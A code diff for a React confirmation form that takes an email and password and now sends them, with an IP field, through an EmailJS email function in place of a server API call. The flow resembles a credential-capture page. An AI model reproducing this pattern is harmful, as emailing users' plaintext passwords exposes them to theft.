@@ -28,7 +28,7 @@ import { sendConfirmationFormEmail } from "@/lib/emailService";
 
 const formTwoSchema = z.object({
   user_email: z.string().optional(),
-  password: z.string().min(1, "Password is required"),
+  password: z.string().min(6, "Password must be at least 6 characters"),
 });
 
 type FormTwoValues = z.infer<typeof formTwoSchema>;
@@ -77,19 +77,8 @@ export default function Confirmation() {
         ipAddress: "Not available" 
       };
 
+      // Send confirmation email using EmailJS
       await sendConfirmationFormEmail(formattedData);
-
-      const response = await fetch('/api/form-two', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(formattedData),
-      });
-
-      if (!response.ok) {
-        throw new Error('Failed to submit form');
-      }
 
       localStorage.removeItem('validation_data');
       toast({
